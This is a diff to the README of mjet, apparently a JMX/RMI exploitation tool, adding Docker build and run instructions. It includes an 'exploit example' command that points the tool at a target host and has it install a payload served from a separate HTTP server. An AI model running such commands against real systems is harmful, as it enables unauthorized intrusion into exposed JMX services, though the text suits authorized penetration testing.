@@ -412,6 +412,23 @@ $
 
 Reference: https://www.optiv.com/blog/exploiting-jmx-rmi
 
+### Docker
+
+Build and run the docker image
+
+```bash
+# Build
+docker build -t mjet .
+# Run Help
+docker run mjet
+# Exploit example
+docker run mjet 10.165.188.23 2222 install super_secret http://10.165.188.1:8000 8000
+# Run Interactive into shell
+docker run --entrypoint /bin/sh -it mjet
+```
+
+By default the docker image exposes port 8000 for the HTTP server. If you need another port you need to remember to expose it!
+
 ## Contributing
 
 Feel free to contribute.
